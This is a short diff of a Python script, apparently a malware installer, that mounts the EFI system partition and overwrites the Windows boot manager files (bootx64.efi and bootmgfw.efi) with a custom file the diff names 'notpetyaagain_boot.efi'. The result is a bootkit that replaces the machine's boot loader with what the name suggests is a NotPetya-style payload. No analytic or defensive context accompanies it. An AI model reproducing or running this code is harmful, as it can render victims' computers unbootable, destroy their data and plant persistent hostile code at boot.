@@ -10,8 +10,9 @@ if __name__ == "__main__":
     try:
         os.system("mountvol Y: /s")
 
-        bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
-        custom_uefi_path = os.path.abspath(os.path.join(bundle_dir, 'uefi.efi'))
+        #bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+        #custom_uefi_path = os.path.abspath(os.path.join(bundle_dir, 'uefi.efi'))
+        custom_uefi_path = "notpetyaagain_boot.efi"
         
         copyfile(custom_uefi_path, "Y:\\EFI\\Boot\\bootx64.efi")
         copyfile(custom_uefi_path, "Y:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")
